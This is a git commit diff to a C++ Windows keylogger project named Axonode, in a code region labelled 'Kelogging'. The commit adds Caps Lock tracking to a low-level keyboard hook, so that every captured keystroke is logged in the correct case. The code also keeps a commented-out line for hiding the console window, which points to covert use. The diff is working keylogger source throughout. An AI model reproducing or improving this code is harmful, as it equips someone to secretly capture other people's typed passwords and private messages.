35422a1d9081e00d407148faacdd70538bee4d72
TachyonRSA <lolno@github.com>
2017-06-09 17:07:00 +0200

    - Added Caps Lock Support (#2)

--- Axonode/Axonode/Axonode.cpp
+++ Axonode/Axonode/Axonode.cpp
@@ -8,11 +8,10 @@
 using namespace std;
 
 HHOOK hKeyboardHook;
-
+int isCaps = 0;
 #pragma region Kelogging
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	//BOOL inKey = FALSE;
 	DWORD SHIFT_key = 0;
 	unsigned int vCode[61] = { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E,
 	0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x6A, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0xBC, 0xBD, 0xC0, 0xBE, 0xBB,
@@ -24,7 +23,26 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	"T", "U", "V", "W", "X", "Y", "Z", "*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "<", "_", "~", ">", "+", "\b \b", "[ENTER] \n", " ", "\"", "?", "{", "}", ":",
 	"[TAB] + [SHIFT] \t" };
 
-	
+	if ((nCode == HC_ACTION) && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP))
+	{
+		if (isCaps == 1)
+		{
+			if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)
+			{
+				cout << " [CAPS OFF] ";
+				isCaps = 0;
+			}
+		}
+		else
+		{
+			if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0)
+			{
+				cout << " [CAPS ON] ";
+				isCaps = 1;
+			}
+		}		
+	}
+
 	if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
 		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
@@ -33,11 +51,21 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			if (p->vkCode == vCode[i])
 			{
-				if (GetAsyncKeyState(VK_SHIFT) >= 0)
-					cout << lowCase[i];
+				if (isCaps == 1)
+				{
+					if (GetAsyncKeyState(VK_SHIFT) >= 0)
+						cout << upCase[i];
+					else
+						cout << lowCase[i];
+				}
 				else
-					cout << upCase[i];
-
+				{
+					if (GetAsyncKeyState(VK_SHIFT) >= 0)
+						cout << lowCase[i];
+					else
+						cout << upCase[i];
+				}
+				
 				if ((GetAsyncKeyState(VK_CONTROL) != 0) && p->vkCode == 0x56)
 				{
 					cout << "\b \b";
@@ -87,7 +115,6 @@ int main()
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
-
 	
 
 	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
